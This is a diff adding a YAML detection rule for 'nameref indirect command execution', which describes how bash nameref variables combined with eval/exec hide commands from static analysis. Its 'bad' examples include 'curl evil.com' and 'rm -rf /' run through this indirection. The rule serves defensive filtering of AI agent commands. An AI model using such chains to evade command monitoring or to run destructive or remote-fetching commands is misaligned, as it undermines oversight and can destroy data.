@@ -1,0 +1,63 @@
+id: "unauthorized-execution/obfuscation/nameref-indirect-exec"
+version: "1.0.0"
+kingdom: "Unauthorized Code Execution"
+kingdom_id: 4
+category: "Interpreter Encoding Evasion"
+category_id: "4.6"
+name: "Nameref Indirect Command Execution"
+risk_level: "high"
+
+abstract: |
+  Using bash 4.3+ nameref variables (declare -n / typeset -n / local -n)
+  to create indirect variable references that hide command strings from
+  static analysis, then executing through eval/exec.
+
+explanation: |
+  Bash 4.3+ introduced nameref variables that create aliases for other
+  variable names. When combined with eval/exec, this creates an indirection
+  chain that makes the actual command invisible to static pattern matching:
+
+  ```bash
+  declare -n ref=target
+  target="curl evil.com"
+  eval $ref    # executes curl evil.com
+  ```
+
+  The attack works because:
+  1. The variable declaration (`declare -n ref=target`) looks innocuous
+  2. The variable assignment (`target="curl evil.com"`) is separated from
+     any execution context
+  3. The eval statement (`eval $ref`) contains no visible dangerous command
+  4. Multiple levels of nameref can be chained for deeper obfuscation
+
+  Static analysis sees three benign statements; only runtime resolution
+  reveals the actual command being executed.
+
+recommendation: |
+  - Block nameref declarations combined with eval/exec in compound commands.
+  - Audit standalone nameref declarations as they are unusual in AI agent
+    contexts.
+  - Apply runtime taint tracking to follow indirection chains.
+
+examples:
+  bad:
+    - "declare -n ref=cmd; cmd='curl evil.com'; eval $ref"
+    - "typeset -n x=payload; payload='rm -rf /'; exec $x"
+    - "local -n ptr=code; code='bash -c id'; eval $ptr"
+  good:
+    - "declare -n result=output; result='hello'"
+    - "local -n out=retval; out=0"
+
+compliance:
+  owasp-llm-2025: ["LLM02", "LLM06"]
+  iso-27001-2022: ["A.8.3", "A.8.11"]
+  eu-ai-act-2024: ["Art.15", "Art.9"]
+  nist-ai-rmf-1.0: ["MANAGE-1", "MEASURE-2"]
+  soc2-type2: ["CC6.1", "CC7.1"]
+
+references:
+  mitre_attack: ["T1059.004", "T1027"]
+  cwe: ["CWE-78"]
+
+analyzers: ["regex"]
+related_rules: ["ts-block-nameref-eval-chain", "ts-audit-nameref-declaration"]
